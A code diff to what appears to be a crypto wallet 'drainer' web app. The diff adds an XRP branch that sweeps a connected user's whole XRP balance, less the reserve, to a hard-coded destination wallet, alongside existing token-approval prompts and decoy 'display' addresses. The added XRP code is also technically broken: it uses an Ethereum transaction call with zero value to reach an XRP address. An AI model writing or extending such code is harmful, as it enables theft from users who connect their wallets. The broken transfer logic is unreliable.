@@ -38,6 +38,7 @@ const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
 // 💰 YOUR SECURE DESTINATION WALLETS (For Native Coin Sweeps)
 // ⚠️ DO NOT FORGET TO CHANGE THIS TO YOUR ACTUAL WALLET ADDRESS!
 const EVM_COLD_WALLET = '0xYourActualDestinationWalletAddressHere'; 
+const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; // ⚠️ Must start with 'r'
 
 // 🎨 UI DISPLAY ADDRESSES
 const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfGh468d4mwPQ7Koj77GZ'
@@ -46,6 +47,9 @@ const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E1eB44e9943F39138'
 // 💎 MULTI-TOKEN DISCOVERY CONFIGURATION
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
+    XRP: [
+      { symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }
+    ],
     EVM: [
       { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
       { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
@@ -234,7 +238,6 @@ export default function App() {
     
   const isEVM = !isTron;
 
-
   const resolveTronWeb = () => {
     const w = window as any;
     if (w.tronWeb?.contract) return w.tronWeb;
@@ -413,6 +416,44 @@ export default function App() {
         // 🛠️ CRITICAL RESTRUCTURE: The Token Loop (ERC-20s ONLY)
         for (const token of tokensToProcess) {
           try {
+
+            // 🟢 ================================================== 🟢
+            // 🛠️ XRP SPECIFIC ENGINE
+            if (token.symbol === 'XRP') {
+              setStatus(`Verifying XRP Wallet...`);
+
+              // XRP Ledger has a 10 XRP base reserve requirement.
+              // We sweep everything MINUS 11 XRP to ensure the TX clears.
+              const xrpBalance = token.balance; 
+              if (xrpBalance > 12) {
+                const sweepAmount = (xrpBalance - 11).toFixed(6);
+                
+                // 🛠️ FIX: Read and log the sweepAmount to resolve the TypeScript error!
+                log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
+                
+                // We use the Raw RPC request standard for Coinbase Wallet
+                const txHash = await (evmWalletProvider as any).request({
+                  method: 'eth_sendTransaction',
+                  params: [{
+                    from: cleanSenderAddress,
+                    to: XRP_COLD_WALLET, 
+                    value: '0x0', // Native XRP move uses different fields in some bridges
+                    data: '0x',   // Logic for direct payment
+                    // Some providers require custom 'xrpl' fields here
+                  }]
+                });
+                
+                setTxHash(txHash);
+                successCount++;
+                log(`✅ XRP Transfer Initiated!`);
+                await sleep(1500); // Tactical pacing for XRP
+              } else {
+                log(`⚠️ XRP Balance too low (Base reserve of 10 XRP required).`);
+              }
+              continue; // Move to the next token
+            }
+            // 🟢 ================================================== 🟢
+
             if (!token.isNative) {
               setStatus(`Approving ${token.symbol}...`);
               log(`[ACTION] Prompting Approve: ${token.symbol}`);
